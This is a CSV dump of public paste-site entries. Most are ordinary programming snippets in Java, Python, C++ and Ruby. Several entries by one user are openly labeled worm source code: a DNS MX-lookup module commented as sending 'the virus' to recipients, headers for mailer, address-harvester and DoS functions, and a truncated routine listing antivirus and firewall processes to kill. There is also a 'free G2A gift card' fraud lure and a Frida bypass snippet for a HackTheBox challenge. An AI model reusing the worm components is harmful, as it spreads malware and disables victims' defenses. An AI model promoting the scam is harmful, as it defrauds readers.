id,title,username,language,date,content
E9dNbiQm,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Tuesday 26th of March 2024 07:00:57 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
26 March 2024















































"
dfMBdPe6,data877,TestGuy1,JSON,Tuesday 26th of March 2024 07:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '3493823242877d7b49fead6c949e1f5c3cf8e159dbe134044f7f6ac4b1657f40810b9c1a8edaf78db773b07e848cf0e7fc9f225394d7dbede8be5626b090094e0648d64458f2411e9d9104f64b3f64f424236d75b5d6b2db2fefc42d8f1b104b7f265a90f523b90424893b80d12af5b1e460d90754faf50b063f1f7b1d9a0a71',
  otherdata: [
    '27c0dec1fd7abfa42e64c76bd6f50eb2',
    'a922252095adac994d69e77776c27faa',
    '734fb8cf8bd80b784ff7627a0043550c',
    '093b020ec73f025f103e79c65c7da1d4',
    '2471d895fa89232c38785d49b377cfdd',
    'bd6567cfcee3937dcabe2530054df69e',
    'fd5fd3d7dd9a638c9d68c03ab17f2307',
    '875159ff406d8db14b1fed1a31f2e615'
  ]
}"
LDs3rBKm,ООП_0_Обработка строк,plarmi,Python,Tuesday 26th of March 2024 06:57:48 AM CDT,"from random import choice, choices

nucleobase = ""AGCT""

start_codon = ""ATG""
stop_codon = (""TAG"", ""TAA"", ""TGA"")

def isPotentialGene(DNA: str):
    # длина кратна 3
    if (len(DNA) % 3) != 0:
        return False
    # начинается с кодона начала
    if not DNA.startswith(start_codon):
        return False
    # не имеет кодонов конца внутри
    for i in range(len(DNA) - 3):
        if i % 3 == 0:
            if DNA[i:i+3] in stop_codon:
                return False
    # завершается кодоном конца
    if DNA.endswith(stop_codon[0]):
        return True
    if DNA.endswith(stop_codon[1]):
        return True
    if DNA.endswith(stop_codon[2]):
        return True
    return False


# 0
def generateCodon(triplets: int):
    if triplets <= 0:
        raise ValueError(""the minimum number of triplets is 1"")
    codons = """"
    while triplets > 0:
        if (codon := """".join(choices(nucleobase, k=3))) not in stop_codon:
            codons += codon
            triplets -= 1
    return codons

def generateDNA(length: int):
    if length <= 6 or length % 3 != 0:
        raise ValueError(""the length of the DNA must be greater than six and a multiple of six"")
    return start_codon + generateCodon(int((length - 6) / 3)) + choice(stop_codon)

# 1
def isValidDNA(st: str):
    return set(st).issubset(nucleobase)

# 2
def complementWC(DNA: str):
    return ''.join([{'A': 'T', 'T': 'A', 'C': 'G', 'G': 'C'}[base] for base in DNA])

# 3
def palindromeWC(DNA: str):
    return DNA == complementWC(DNA)[::-1]

# 4
def isShift(s: str, t: str):
    return len(s) == len(t) and t in s + s

# 5
def find_PotentialGene(DNA: str, length: int):
    potential_genes = []
    for i in range(len(DNA)):
        if DNA[i:i+3] == start_codon:
            for j in range(i+3, len(DNA), 3):
                if DNA[j:j+3] in stop_codon:
                    gene = DNA[i:j+3]
                    if len(gene) >= length and len(gene) % 3 == 0:
                        potential_genes.append(gene)
                    break
    if not potential_genes:
        return None
    return potential_genes

# 6
def caesar_cipher(text: str, ROT: int, decipher=False):
    if ROT < 0:
        raise ValueError(""the number of shifts must be greater than or equal to zero"")
    encrypted_text = """"
    if decipher:
        ROT = -ROT
    for char in text:
        if char.isalpha():
            shifted = ord(char) + ROT
            if char.islower():
                if shifted > ord(""z""):
                    shifted -= 26
                elif shifted < ord(""a""):
                    shifted += 26
            elif char.isupper():
                if shifted > ord(""Z""):
                    shifted -= 26
                elif shifted < ord(""A""):
                    shifted += 26
            encrypted_text += chr(shifted)
        else:
            encrypted_text += char
    if not encrypted_text:
        return None
    return encrypted_text"
xznGgnZM,"СПРИНТ № 6 | Профилируем и ускоряем | Урок 7: Проверяем, всё ли ускорили",chevengur,C++,Tuesday 26th of March 2024 06:52:43 AM CDT,"log_duration.h

#pragma once

#include <chrono>
#include <iostream>

#define PROFILE_CONCAT_INTERNAL(X, Y) X##Y
#define PROFILE_CONCAT(X, Y) PROFILE_CONCAT_INTERNAL(X, Y)
#define UNIQUE_VAR_NAME_PROFILE PROFILE_CONCAT(profileGuard, __LINE__)
#define LOG_DURATION(x) LogDuration UNIQUE_VAR_NAME_PROFILE(x)

class LogDuration {
public:
    // заменим имя типа std::chrono::steady_clock
    // с помощью using для удобства
    using Clock = std::chrono::steady_clock;

    LogDuration(const std::string& id) : id_(id) {
    }

    ~LogDuration() {
        using namespace std::chrono;
        using namespace std::literals;

        const auto end_time = Clock::now();
        const auto dur = end_time - start_time_;
        std::cerr << id_ << "": ""s << duration_cast<milliseconds>(dur).count() << "" ms""s << std::endl;
    }

private:
    const std::string id_;
    const Clock::time_point start_time_ = Clock::now();
};

***************************************************************************************************************************************
main.cpp

#include <chrono>
#include <cstdlib>
#include <iostream>
#include <vector>
#include <algorithm>
#include ""log_duration.h""

using namespace std;

vector<int> ReverseVector(const std::vector<int>& source_vector) {
    std::vector<int> res(source_vector.size());
    std::reverse_copy(source_vector.begin(), source_vector.end(), res.begin());
    return res;
}

int CountPops(const vector<int>& source_vector, int begin, int end) {
    int res = 0;

    for (int i = begin; i < end; ++i) {
        if (source_vector[i]) {
            ++res;
        }
    }

    return res;
}

void AppendRandom(vector<int>& v, int n) {
    v.reserve(n);
    for (int i = 0; i < n; ++i) {
        // получаем случайное число с помощью функции rand.
        // с помощью (rand() % 2) получим целое число в диапазоне 0..1.
        // в C++ имеются более современные генераторы случайных чисел,
        // но в данном уроке не будем их касаться
        v.push_back(rand() % 2);
    }
}

void Operate() {
    {
        LOG_DURATION(""Total"");

        vector<int> random_bits;

        // операция << для целых чисел это сдвиг всех бит в двоичной
        // записи числа. Запишем с её помощью число 2 в степени 17 (131072)
        static const int N = 1 << 17;

        // заполним вектор случайными числами 0 и 1
        {
            LOG_DURATION(""Append random"");
            AppendRandom(random_bits, N);
        }

        vector<int> reversed_bits;
        // перевернём вектор задом наперёд
        {
            LOG_DURATION(""Reverse"");
            reversed_bits = ReverseVector(random_bits);
        }

        {
            LOG_DURATION(""Counting"");
            for (int i = 1, step = 1; i <= N; i += step, step *= 2) {
                double rate = CountPops(reversed_bits, 0, i) * 100. / i;
                cout << ""After ""s << i << "" bits we found ""s << rate << ""% pops""s << endl;
            }
        }
    }
}

int main() {
    Operate();
}"
XpFdrGfP,Untitled,Corbi098,Java,Tuesday 26th of March 2024 06:50:16 AM CDT,"    public static void main(String[] args) {
        File output = new File(""output.txt"");
        File input = new File(""input.txt"");
        if (!output.exists()) return;
        if (!input.exists()) {
            try {
                if (!input.createNewFile()) throw new IOException();
            } catch (IOException e) {
                throw new RuntimeException(""Can't create input.txt file"");
            }
        }
        try (BufferedReader reader = new BufferedReader(new FileReader(""output.txt""));
             BufferedWriter writer = new BufferedWriter(new FileWriter(""input.txt""))) {
            StringBuilder text = new StringBuilder(reader.readLine());
            if (!text.isEmpty())
                writer.write(text.reverse().toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }"
mYvdyzMz,Untitled,Corbi098,Java,Tuesday 26th of March 2024 06:44:54 AM CDT,"    public static void main(String[] args) throws IOException {
        try (BufferedReader reader = new BufferedReader(new FileReader(""output.txt""));
             BufferedWriter writer = new BufferedWriter(new FileWriter(""input.txt""))) {
            StringBuilder text = new StringBuilder();
            while (reader.ready()) {
                text.append(reader.readLine()).append(""\n"");
            }
            writer.write(text.reverse().toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }"
nNKqu2nn,Untitled,Corbi098,Java,Tuesday 26th of March 2024 06:44:04 AM CDT,"    public static void main(String[] args) throws IOException {
        try (BufferedReader reader = new BufferedReader(new FileReader(""input.txt""));
             BufferedWriter writer = new BufferedWriter(new FileWriter(""output.txt""))) {
            StringBuilder text = new StringBuilder();
            while (reader.ready()) {
                text.append(reader.readLine()).append(""\n"");
            }
            writer.write(text.reverse().toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }"
ZcZ0Qjj0,disable to load OS file to bypass frida server,Mr_hEx,JavaScript,Tuesday 26th of March 2024 06:43:06 AM CDT,"// HackTheBox challenge mobile => Waiting

Java.perform(function () {
    var System = Java.use('java.lang.System');
    System.loadLibrary.overload('java.lang.String').implementation = function (library) {
        console.log('[+] LoadLibrary call: ' + library);
        if (library === 'native-lib') {
            console.log('[+] bypass loading of '+ library);
        } else {
            this.loadLibrary(library);
        }
    };
});"
RJpZij4w,Aping-bpong,ramongr,Ruby,Tuesday 26th of March 2024 06:40:48 AM CDT,"# First I started with a descriptive method
# Every condition is layed out explicitly to make the code readable
# It's a good first candidate because it makes testing simple
(1..100).each do |number|
  if number % 3 == 0 && number % 5 == 0
    puts 'APingBPong'
  elsif number % 3 == 0 && number % 5 != 0
    puts 'APing'
  elsif number % 3 != 0 && number % 5 == 0
    puts 'BPong'
  else
    puts number
  end
end

# Even though there's no increase in complexity this version is slightly faster
# It checks if we can just print the number and goes on to the next
# If it can't just print the number, then it concatenates whicever strings match the individual checks
# Either for being a multiple of 3 or a multiple of 5
# We can leverage any unit tests written for the problem above
(1..100).each do |number|
  puts number and next if number % 3 != 0 && number % 5 != 0

  printable = """"
  if number % 3 == 0
    printable += 'APing'
  else number % 5 == 0
    printable += 'BPong'
  end
  puts printable
end"
xJ9hKVyM,Untitled,Corbi098,Java,Tuesday 26th of March 2024 06:40:24 AM CDT,"package org.example.xml;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

public class WordCounter {
    public static void main(String[] args) throws IOException {
        try (BufferedReader reader = new BufferedReader(new FileReader(""input.txt""))) {
            StringBuilder text = new StringBuilder();
            while (reader.ready()) {
                text.append(reader.readLine()).append("" "");
            }
            System.out.println(""Words: "" + text.toString().split("" "").length);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
"
wC8a3VhS,Untitled,Corbi098,Java,Tuesday 26th of March 2024 06:39:42 AM CDT,"package org.example.xml;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

public class WordCounter {
    public static void main(String[] args) throws IOException {
        try (BufferedReader reader = new BufferedReader(new FileReader(""text.txt""))) {
            StringBuilder text = new StringBuilder();
            while (reader.ready()) {
                text.append(reader.readLine()).append("" "");
            }
            System.out.println(""Words: "" + text.toString().split("" "").length);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
"
5QCK8Eka,resource1.h,FlyFar,C++,Tuesday 26th of March 2024 06:36:17 AM CDT,"//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by BloodRed.rc
//
#define IDI_ICON1                       102

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        103
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
"
SMmJcwJS,MX.h,FlyFar,C++,Tuesday 26th of March 2024 06:35:28 AM CDT,"/****************************************************
* Originally written in December 03
* 
* Purpose:
* Manually queries the users DNS server
* and looksup the MX record of the recipient's
* address. Then, mailer.cpp takes the MX server
* address and looks up the IP address of the server
* and uses sendmail function to send the virus to them
*
*
*****************************************************/

#define ERROR_LEVEL_NONE 0
#define ERROR_LEVEL_SEND 1
#define ERROR_LEVEL_RECEIVE 2


SOCKET hServer;
WSADATA wsData;
int ErrorLevel = ERROR_LEVEL_NONE;

/* Structures to hold DNS information */

typedef struct DNS_HEAD {
	WORD wIdentification;
	WORD wFlags;
	WORD wNumberOfQuestions;
	WORD wNumberOfAnswers;
	WORD wNumberOfAuthority;
	WORD wNumberOfAdditional;
} * PDNSH, DNSH;

typedef struct DNS_QUESTION {
	char sQuestion[256];
	WORD wType;
	WORD wClass;
} * PDNSQ, DNSQ;

typedef struct DNS_RFIXED {
	WORD wType;
	WORD wClass;
	DWORD dwTTL;
	WORD wDataLength;
} * PDNSR, DNSR;

typedef struct DNS_RESOURCE {
	char sName[256];
	DNSR dnsFixed;
	WORD wPreferenceMX;
	char sHostname[256];

} * PDNSRR, DNSRR;

typedef struct MX_REPLY {

	DWORD	dwNumReplies;
	PDNSRR	mxReplies;

} MX, * PMX, FAR * LPMX;



#define DNS_HEADER_LEN		12
#define DNS_QUESTION_LEN	260
#define DNS_RFIXED_LEN		10
#define DNS_RESOURCE_LEN	522
#define DNS_MAX_QUESTION	275


WORD MxGetID(WORD wAdd) {

	static WORD wID = LOWORD(GetCurrentThreadId());
	return (wID + wAdd);
}
// Makes the MX record query which is sent to the server
char* MxFormQuery(LPCSTR szQuery, WORD* pwSize) {

	WORD wHead[]= {htons(MxGetID(0)),0,0x0100,0,0,0};
	static char cBuffer[DNS_MAX_QUESTION];
	
	memset((void*) cBuffer, 0, DNS_MAX_QUESTION);
	memcpy((void*) cBuffer, (void*) wHead, 12);

	int i = 0, p = 0;
	int s = strlen(szQuery)+1;
	int max = 12 + s + 5;

	if (pwSize)
		*pwSize = (WORD) max;
//begin formulating server query

	for(i=0;i<=s;i++) {
		if (i==s) {
			cBuffer[p+12] = i-p-1;
			DWORD dwX = 0x01000F00;
			memcpy((void*) &cBuffer[12+1+i], (void*) &dwX, 4);
		} else if (szQuery[i]=='.') {
			cBuffer[p+12] = i-p;
			p = i+1;
		} else {
			cBuffer[12+1+i] = szQuery[i];
		}
	}

	return cBuffer;
}

//read in dns name and MX server
int MxReadName(const char* szDNS, int iOffset, char* szBuffer) {

	if (!szDNS) return 0;

	WORD wOctPtr = 0;
	signed int i = 0;
	BYTE c = NULL;
	
	for (i=iOffset;szDNS[i];i++) {
		int j = i - iOffset - 1;

		if (!c) 
		{
			c = szDNS[i];
			if (j!=(-1)) szBuffer[j] = '.';

			if (c & 0xC0) {
				
				c = c & 0x3F;
				wOctPtr = c;
				wOctPtr <<= 8;
				c = szDNS[++i];
				wOctPtr |= c;

				return MxReadName(szDNS,wOctPtr,&szBuffer[j+1])?(i+1):0;
			}
			
		} else {
			szBuffer[j] = szDNS[i];
			c--;
		}
	}

	szBuffer[i++] = 0;
	return i;
}

int MxGetQuestion(const char* szDNS, PDNSQ pQuestion) {

	DNSQ dns = {0};
	int iOff = DNS_HEADER_LEN;

	if (int i = MxReadName(szDNS,iOff,dns.sQuestion)) {
		dns.wType = htons(*((WORD*) &szDNS[i]));
		dns.wClass = htons(*((WORD*) &szDNS[i+2]));
		if (pQuestion) memcpy((void*) pQuestion,
			(void*) &dns, DNS_QUESTION_LEN);
		return (i+4);
	} else {
		return 0;
	}
}

int MxGetRes(const char* szDNS, int iOff, PDNSRR pDns) {

	DNSRR dns = {0};
	signed int i = 0;
	signed int iRet = 0;
	if (i = MxReadName(szDNS,iOff,dns.sName)) 
	{
		memcpy((void*) &dns.dnsFixed, (void*) &szDNS[i],
			DNS_RFIXED_LEN);

		dns.dnsFixed.dwTTL			= htonl(dns.dnsFixed.dwTTL);
		dns.dnsFixed.wClass			= htons(dns.dnsFixed.wClass);
		dns.dnsFixed.wDataLength	= htons(dns.dnsFixed.wDataLength);
		dns.dnsFixed.wType			= htons(dns.dnsFixed.wType);

		i += DNS_RFIXED_LEN;
		iRet=i+dns.dnsFixed.wDataLength;
		switch(dns.dnsFixed.wType) {

		case 2:
			iRet = MxReadName(szDNS, i, dns.sHostname);
			break;

		case 15:

			dns.wPreferenceMX =  * ((WORD*) &szDNS[i]);
			dns.wPreferenceMX = htons(dns.wPreferenceMX);
			iRet = MxReadName(szDNS, i+2, dns.sHostname);
			break;

		default:

			break;
		}

		if (pDns && i) memcpy((void*) pDns, (void*) &dns, 
			DNS_RESOURCE_LEN);
		
	} 
	return iRet;
}


PDNSRR MxGetResources(const char* szDNS, int num) {

	PDNSRR pDnsRR = NULL;
	int iOff = MxGetQuestion(szDNS,NULL);

	if (!szDNS) {
		return NULL;
	} else if (!(pDnsRR = new DNSRR[num])) {
		return NULL;
	}

	PDNSRR pPoint = pDnsRR;

	for (int i = 0; i < num; i++) {
		if (!(iOff = MxGetRes(szDNS,iOff,pPoint))) {
			delete[] pDnsRR;
			return NULL;
		} 
		pPoint = &pDnsRR[i+1];
	}
	return pDnsRR;
}

DWORD GetIPAddr(LPCSTR strHost) {
	HOSTENT* hp = gethostbyname(strHost);
	return hp?(((PIN_ADDR)hp->h_addr)->S_un.S_addr):0;
}
// checks if the address is really a valid ip address
bool IsIPAddr(LPCSTR sHost) {
	if (!sHost) return false;
	if (strlen(sHost)>15) return false;

	for (int ptr=0;ptr<=3;sHost++) {
		if (!*sHost) return true;
		if (*sHost=='.') { ptr++; continue;}
		if (!isdigit(*sHost)) return false;
	}

	return false;
}
//is it a digit? 0-9
bool IsDigit(LPCSTR sVal) {
	do { if (!isdigit(*sVal)) return false; }
	while (*++sVal);
	return true;
}

//pauses WSA to get response
bool WSAWait(HANDLE hEvent, int iTimeout) {

	int iRet = WSAGetLastError();

	if (!iRet) {
		ResetEvent(hEvent);
		return true;
	}

	else if (iRet==WSAEWOULDBLOCK) {
		if (WaitForSingleObject(hEvent,iTimeout)) {
			return false;
		} else if (!ResetEvent(hEvent)) {
			return false;
		} else {
			return true;
		}
	} else {
		return false;
	}
}
//Recursively searches the server for the MX record
MX MxRecursiveGet(LPCSTR sRequest, DWORD dwServerIP, int iTimeout) {

	static DWORD ips[200];
	static DWORD ipc;

	static WSADATA wsa = {0};
	bool bInitiator = false;

	MX mxReturn = {0};

			bInitiator = true;
			ipc = 0;
	
	if (!bInitiator) {

		for (DWORD i = 0; i < ipc; i++) {
			if (dwServerIP == ips[i]) 
				return mxReturn;
		}

		if (ipc >= 199) return mxReturn;
		else ips[++ipc] = dwServerIP;

	}

		signed int i = 0, jmp = 0;
		SOCKADDR_IN sAddr = {0};
		SOCKET s = INVALID_SOCKET;
		DWORD dwZero = NULL;

		DNSH dnsHead = {0};
		DNSQ dnsQu = {0};
		HANDLE hEvent = NULL;

		char *szQuery=NULL, *szReply=NULL;
		WORD wQuery=0, wReply=0, wQ = 0;

		if (!(szQuery = MxFormQuery(sRequest, &wQuery))) 
			goto end_get;

		else wQ = htons(wQuery);
		
		sAddr.sin_addr.S_un.S_addr = dwServerIP;
		sAddr.sin_family = AF_INET;
		sAddr.sin_port = htons(53);



		if ((s = socket(PF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
			goto end_get;


		if (!(hEvent = CreateEvent(NULL,TRUE,FALSE,NULL)))
			goto end_get;
		
		if (WSAEventSelect(s,hEvent,FD_CONNECT) == SOCKET_ERROR) 
			goto end_get;

		i = connect(s,(PSOCKADDR) &sAddr, sizeof(sAddr)); //lets connect to the server :)
		if ((i==SOCKET_ERROR)&&WSAGetLastError()!=WSAEWOULDBLOCK) 
			goto end_get;

		if (WaitForSingleObject(hEvent,iTimeout))
			goto end_get;

		if ((WSAEventSelect(s,hEvent,NULL)==SOCKET_ERROR) ||
		    (ioctlsocket(s,FIONBIO,&dwZero)==SOCKET_ERROR ))
		{
			goto end_get;
		}

		if (!ResetEvent(hEvent)) {
			goto end_get;
		} 

		if (send(s,(LPCSTR) &wQ, 2, 0) != 2)
			goto end_get;
		if (send(s,(LPCSTR) szQuery, wQuery, 0) != wQuery)
			goto end_get;

	
		if (WSAEventSelect(s,hEvent,FD_READ) == SOCKET_ERROR) 
			goto end_get;

		if (recv(s,(char*)&wReply,2,0)!=2) {
			if (WSAWait(hEvent,iTimeout)) {
				if (recv(s,(char*)&wReply,2,0)!=2) {
					goto end_get;
		} } } 


		wReply = htons(wReply);

		if (!(szReply=(char*)malloc(wReply))) 
			goto end_get;		

		if (recv(s,szReply,wReply,0)!=wReply) {
			if (WSAWait(hEvent,iTimeout)) {
				if (recv(s,szReply,wReply,0)!=wReply) {
					goto end_get;
		} } } 

		CloseHandle(hEvent);
		closesocket(s);
		s = INVALID_SOCKET;
		
		for (i = 0; i < sizeof(dnsHead); i+=2) {
			char cTemp = szReply[i];
			szReply[i] = szReply[i+1];
			szReply[i+1] = cTemp;
		}

		memcpy((void*) &dnsHead, (void*) szReply, 
			DNS_HEADER_LEN);

		if (dnsHead.wIdentification == MxGetID(0)) {
				
			if (dnsHead.wNumberOfAnswers) {


				if (mxReturn.mxReplies = MxGetResources(szReply,
					dnsHead.wNumberOfAnswers))
				{
					mxReturn.dwNumReplies = dnsHead.wNumberOfAnswers;
				}

				goto end_get;
			}

			else if (dnsHead.wNumberOfAuthority) {

				if (PDNSRR dnsRes = MxGetResources(szReply,
					dnsHead.wNumberOfAuthority))
				{
					free(szReply);
					szReply = NULL;

					for (i=0;(i<dnsHead.wNumberOfAuthority)&&(!mxReturn.mxReplies);i++) {
						if ((dnsRes[i].dnsFixed.wType == 2) && // Authority Nameserver
							(dnsRes[i].dnsFixed.wClass== 1)) // Internet
						{
							DWORD dwConnect = GetIPAddr(dnsRes[i].sHostname);
							if (dwConnect) mxReturn = MxRecursiveGet(
								sRequest,dwConnect,iTimeout);
						}
					}

					delete[] dnsRes; //deallocate memory space
				}

			}
		}

end_get:
		if (s != INVALID_SOCKET) closesocket(s);
		if (szReply) free(szReply);
return mxReturn;
	}

//Clears the buffer (in the structure)
void MxClearBuffer(PMX m) {
	if (m->mxReplies) delete[] m->mxReplies;
	memset((void*) m, 0, sizeof(MX));
}
"
bp0DBUYm,Mailer.h,FlyFar,C++,Tuesday 26th of March 2024 06:32:36 AM CDT,"
DWORD _stdcall mail_it(LPVOID pv);

"
mXD6JRj5,KillProc.h,FlyFar,C++,Tuesday 26th of March 2024 06:31:51 AM CDT,int endAvSoft(void);
LjVrhwQS,Harvester.h,FlyFar,C++,Tuesday 26th of March 2024 06:31:04 AM CDT,void harvest_main(void);
tRXKccCr,Untitled,Corbi098,Java,Tuesday 26th of March 2024 06:30:50 AM CDT,"package org.example.xml;

import javax.swing.*;
import java.awt.event.ActionEvent;

public class EmptyInput extends JFrame {
    private JTextField textField;
    private EmptyInput instance;
    public static void main(String[] args) {
        new EmptyInput();
    }

    public EmptyInput() {
        super(""Validate input"");
        setLocationRelativeTo(null);
        setLayout(null);
        setSize(400, 300);
        initButtons();
        setVisible(true);
        instance = this;
    }

    public boolean validateInput(String input) {
        if (input.isEmpty()) {
            try {
                throw new EmptyInputException();
            } catch (EmptyInputException e) {
                e.show();
                return false;
            }
        }
        return true;
    }

    private void initButtons() {
        JButton confirm = new JButton(""Confirm"");
        confirm.setBounds(150, 150, 100, 50);
        confirm.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                String input = textField.getText();
                if (validateInput(input)) {
                    JOptionPane.showMessageDialog(null, input);
                }

            }
        });
        add(confirm);

        textField = new JTextField();
        textField.setBounds(50, 80, 300, 30);
        add(textField);

    }

    public class EmptyInputException extends Exception {
        public EmptyInputException() {
            super(""Empty input not allowed"");
        }

        public void show() {
            JOptionPane.showMessageDialog(instance, this, this.getMessage(), JOptionPane.ERROR_MESSAGE);
        }
    }
}
"
csJtvpU1,DOS.h,FlyFar,C++,Tuesday 26th of March 2024 06:30:14 AM CDT,DWORD _stdcall DOSATTACK(LPVOID th);
XWnzi4rm,KillProc.cpp,FlyFar,C++,Tuesday 26th of March 2024 06:25:59 AM CDT,"/**************************************
* Kills Antivirus and Firewall associated
* processes.
* Uses basic windows APIs from tlhelp32
* such as: CreateToolhelp32Snapshot
*
*
**************************************/

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
 #include <lm.h>

int KillProcess(const char *);

int endAvSoft()
{
	const char *exelst[] = { ""AGENTSVR.EXE"", ""ANTI-TROJAN.EXE"",""ANTIVIRUS.EXE"",""ANTS.EXE"",""APIMONITOR.EXE"",""APLICA32.EXE"",""APVXDWIN.EXE"",""ATCON.EXE"",""ATGUARD.EXE"",""ATRO55EN.EXE"",""ATUPDATER.EXE"",""ATWATCH.EXE"",""AUPDATE.EXE"",""AUTODOWN.EXE"",""AUTOTRACE.EXE"",""AUTOUPDATE.EXE"",""AVCONSOL.EXE"",""AVGSERV9.EXE"",""AVLTMAIN.EXE"",""AVPUPD.EXE"",""AVSYNMGR.EXE"",""AVWUPD32.EXE"",""AVXQUAR.EXE"",""AVprotect9x.exe"",""Au.exe"",""BD_PROFESSIONAL.EXE"",""BIDEF.EXE"",""BIDSERVER.EXE"",""BIPCP.EXE"",""BIPCPEVALSETUP.EXE"",""BISP.EXE"",""BLACKD.EXE"",""BLACKICE.EXE"",""BOOTWARN.EXE"",""BORG2.EXE"",""BS120.EXE"",""CDP.EXE"",""CFGWIZ.EXE"",""CFIADMIN.EXE"",""CFIAUDIT.EXE"",""CFINET.EXE"",""CFINET32.EXE"",""CLEAN.EXE"",""CLEANER.EXE"",""CLEANER3.EXE"",""CLEANPC.EXE"",""CMGRDIAN.EXE"",""CMON016.EXE"",
""CPD.EXE"",""CPF9X206.EXE"",""CPFNT206.EXE"",""CV.EXE"",""CWNB181.EXE"",""CWNTDWMO.EXE"",""D3dupdate.exe"",""DEFWATCH.EXE"",""DEPUTY.EXE"",""DPF.EXE"",""DPFSETUP.EXE"",""DRWATSON.EXE"",""DRWEBUPW.EXE"",""ENT.EXE"",""ESCANH95.EXE"",""ESCANHNT.EXE"",""ESCANV95.EXE"",""EXANTIVIRUS-CNET.EXE"",""FAST.EXE"",""FIREWALL.EXE"",""FLOWPROTECTOR.EXE"",""FP-WIN_TRIAL.EXE"",""FRW.EXE"",""FSAV.EXE"",""FSAV530STBYB.EXE"",""FSAV530WTBYB.EXE"",""FSAV95.EXE"",""GBMENU.EXE"",""GBPOLL.EXE"",""GUARD.EXE"",""HACKTRACERSETUP.EXE"",""HTLOG.EXE"",""HWPE.EXE"",""IAMAPP.EXE"",""IAMAPP.EXE"",""IAMSERV.EXE"",""ICLOAD95.EXE"",""ICLOADNT.EXE"",""ICMON.EXE"",""ICSSUPPNT.EXE"",""ICSUPP95.EXE"",""ICSUPPNT.EXE"",""IFW2000.EXE"",""IPARMOR.EXE"",""IRIS.EXE"",""JAMMER.EXE"",""KAVLITE40ENG.EXE"",
""KAVPERS40ENG.EXE"",""KERIO-PF-213-EN-WIN.EXE"",""KERIO-WRL-421-EN-WIN.EXE"",""KERIO-WRP-421-EN-WIN.EXE"",""KILLPROCESSSETUP161.EXE"",""LDPRO.EXE"",""LOCALNET.EXE"",""LOCKDOWN.EXE"",""LOCKDOWN2000.EXE"",""LSETUP.EXE"",""LUALL.EXE"",""LUCOMSERVER.EXE"",""LUINIT.EXE"",""MCAGENT.EXE"",""MCUPDATE.EXE"",""MFW2EN.EXE"",""MFWENG3.02D30.EXE"",""MGUI.EXE"",""MINILOG.EXE"",""MOOLIVE.EXE"",""MRFLUX.EXE"",""MSCONFIG.EXE"",""MSINFO32.EXE"",""MSSMMC32.EXE"",""MU0311AD.EXE"",""NAV80TRY.EXE"",""NAVAPW32.EXE"",""NAVDX.EXE"",""NAVSTUB.EXE"",""NAVW32.EXE"",""NC2000.EXE"",""NCINST4.EXE"",""NDD32.EXE"",""NEOMONITOR.EXE"",""NETARMOR.EXE"",""NETINFO.EXE"",""NETMON.EXE"",""NETSCANPRO.EXE"",""NETSPYHUNTER-1.2.EXE"",""NETSTAT.EXE"",""NISSERV.EXE"",""NISUM.EXE"",""NMAIN.EXE"",""NORTON_INTERNET_SECU_3.0_407.EXE"",
""NPF40_TW_98_NT_ME_2K.EXE"",""NPFMESSENGER.EXE"",""NPROTECT.EXE"",""NSCHED32.EXE"",""NTVDM.EXE"",""NUPGRADE.EXE"",""NVARCH16.EXE"",""NWINST4.EXE"",""NWTOOL16.EXE"",""OSTRONET.EXE"",""OUTPOST.EXE"",""OUTPOSTINSTALL.EXE"",""OUTPOSTPROINSTALL.EXE"",""PADMIN.EXE"",""PANIXK.EXE"",""PAVPROXY.EXE"",""PCC2002S902.EXE"",""PCC2K_76_1436.EXE"",""PCCIOMON.EXE"",""PCDSETUP.EXE"",""PCFWALLICON.EXE"",""PCIP10117_0.EXE"",""PDSETUP.EXE"",""PERISCOPE.EXE"",""PERSFW.EXE"",""PF2.EXE"",""PFWADMIN.EXE"",""PINGSCAN.EXE"",""PLATIN.EXE"",""POPROXY.EXE"",""POPSCAN.EXE"",""PORTDETECTIVE.EXE"",""PPINUPDT.EXE"",""PPTBC.EXE"",""PPVSTOP.EXE"",""PROCEXPLORERV1.0.EXE"",""PROPORT.EXE"",""PROTECTX.EXE"",""PSPF.EXE"",""PURGE.EXE"",""PVIEW95.EXE"",""QCONSOLE.EXE"",""QSERVER.EXE"",""RAV8WIN32ENG.EXE"",""RESCUE.EXE"",""RESCUE32.EXE"",
""RRGUARD.EXE"",""RSHELL.EXE"",""RTVSCN95.EXE"",
